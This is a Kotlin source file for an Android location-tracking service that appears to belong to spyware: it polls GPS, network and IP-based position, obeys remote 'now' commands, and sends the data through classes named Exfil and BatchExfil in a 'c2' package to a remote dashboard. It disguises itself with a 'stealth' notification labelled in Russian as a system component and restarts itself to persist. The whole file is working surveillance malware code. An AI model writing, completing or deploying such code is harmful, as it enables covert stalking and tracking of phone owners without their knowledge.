package com.sp.core.services

import android.Manifest
import android.app.*
import android.content.Context
import com.sp.core.util.StealthNotif
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import com.sp.core.util.Fgs
import com.sp.core.util.WebGeo
import org.json.JSONObject
import java.util.concurrent.Executors

/**
 * Location tracking.
 *
 * Order of the sources:
 *   1. gps     - a real fix from the fused provider (needs ACCESS_FINE_LOCATION)
 *   2. network - the last known cell/WiFi position (needs any location grant)
 *   3. web     - IP geolocation, only if nothing else is available
 *
 * The dashboard shows the source with every fix, so an IP position (which on
 * a phone behind a VPN is the exit node of the tunnel and therefore wrong)
 * can never be mistaken for a GPS position.
 */
class LocationService : Service() {

    private var client: FusedLocationProviderClient? = null
    private var callback: LocationCallback? = null
    private val handler = Handler(Looper.getMainLooper())
    private val bg = Executors.newSingleThreadExecutor()
    private var lastSent = 0L

    override fun onCreate() {
        super.onCreate()
        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION,
                buildNotification())) {
            // The location type needs a runtime grant; without it the service
            // must not keep running (and must not be left without a
            // startForeground call - that would kill the whole process).
            stopSelf()
            return
        }
        try {
            client = LocationServices.getFusedLocationProviderClient(this)
        } catch (t: Throwable) {
            client = null
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // The dashboard asked for a fresh position -> answer right away
        // instead of waiting for the next timer tick.
        if (intent?.getBooleanExtra("now", false) == true) {
            sendBestNow("command")
        }
        startTracking()
        return START_STICKY
    }

    private fun hasFineLocation(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun hasAnyLocation(): Boolean =
        hasFineLocation() ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun startTracking() {
        if (!hasAnyLocation()) {
            sendWebLocationAsync("no_permission")
            scheduleNext()
            return
        }

        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, INTERVAL_MS)
            .setMinUpdateIntervalMillis(INTERVAL_MS / 2)
            .setMinUpdateDistanceMeters(50f)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { push(it) }
            }
        }
        callback = cb

        try {
            client?.requestLocationUpdates(request, cb, Looper.getMainLooper())
        } catch (_: Throwable) {
            sendWebLocationAsync("security")
        }

        // The last known position is often good enough and is free.
        pushLastKnown()

        // No fix in time -> fall back to the web source.
        handler.postDelayed({ sendWebLocationAsync("no_fix") }, FALLBACK_AFTER_MS)
        scheduleNext()
    }

    private fun scheduleNext() {
        handler.postDelayed({ startTracking() }, INTERVAL_MS)
    }

    /** The last known position of the fused provider (GPS or network). */
    private fun pushLastKnown() {
        val c = client ?: return
        try {
            c.lastLocation.addOnSuccessListener { loc ->
                if (loc != null) push(loc)
            }
        } catch (_: Throwable) {
        }
    }

    /**
     * One-shot position request: a fresh fix first, the last known position
     * as a backup and the IP position only if nothing else is available.
     */
    private fun sendBestNow(reason: String) {
        if (!hasAnyLocation()) {
            sendWebLocationAsync(reason)
            return
        }
        val c = client ?: run {
            sendWebLocationAsync(reason)
            return
        }
        val token = com.google.android.gms.tasks.CancellationTokenSource().token
        try {
            c.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, token)
                .addOnSuccessListener { loc ->
                    if (loc != null) {
                        push(loc, immediate = true)
                    } else {
                        pushLastKnownImmediate()
                    }
                }
                .addOnFailureListener {
                    pushLastKnownImmediate()
                }
        } catch (_: Throwable) {
            pushLastKnownImmediate()
        }
    }

    private fun pushLastKnownImmediate() {
        val c = client ?: return
        try {
            c.lastLocation.addOnSuccessListener { loc ->
                if (loc != null) push(loc, immediate = true) else sendWebLocationAsync("command")
            }
        } catch (_: Throwable) {
            sendWebLocationAsync("command")
        }
    }

    private fun push(loc: Location, immediate: Boolean = false) {
        val source = if (loc.provider?.contains("gps", true) == true) "gps" else "network"
        val payload = JSONObject().apply {
            put("lat", loc.latitude)
            put("lon", loc.longitude)
            put("acc", loc.accuracy)
            put("alt", loc.altitude)
            put("speed", loc.speed)
            put("ts", loc.time)
            put("provider", loc.provider)
            put("source", source)
        }
        if (immediate) {
            Exfil.sendLog(this, "location", payload.toString())
        } else {
            BatchExfil.enqueue(this, "location", payload.toString())
        }
        lastSent = System.currentTimeMillis()
    }

    /**
     * IP geolocation - the least accurate source. It is only used when the
     * device has no location grant at all, and it is always tagged as "web"
     * so the dashboard can tell it apart from a real fix.
     */
    private fun sendWebLocationAsync(reason: String) {
        bg.execute {
            try {
                val geo = WebGeo.locate() ?: return@execute
                geo.put("fallback", reason)
                if (reason == "command") {
                    // A requested position goes out right away.
                    Exfil.sendLog(this, "location", geo.toString())
                } else {
                    BatchExfil.enqueue(this, "location", geo.toString())
                }
                lastSent = System.currentTimeMillis()
            } catch (_: Throwable) {
            }
        }
    }

    private fun buildNotification(): Notification {
        return com.sp.core.util.StealthNotif.build(
            this, "android_UI", "Системный компонент работает"
        )
    }

    override fun onDestroy() {
        try { callback?.let { client?.removeLocationUpdates(it) } } catch (_: Throwable) {}
        handler.removeCallbacksAndMessages(null)
        try { bg.shutdown() } catch (_: Throwable) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        /** Asks the service for an immediate position update. */
        fun requestNow(ctx: Context) {
            try {
                val i = Intent(ctx, LocationService::class.java).putExtra("now", true)
                if (android.os.Build.VERSION.SDK_INT >= 26)
                    ctx.startForegroundService(i) else ctx.startService(i)
            } catch (_: Throwable) {
            }
        }

        private const val NOTIF_ID = 0x5F61
        const val INTERVAL_MS = 45 * 60 * 1000L
        private const val FALLBACK_AFTER_MS = 25_000L
    }
}
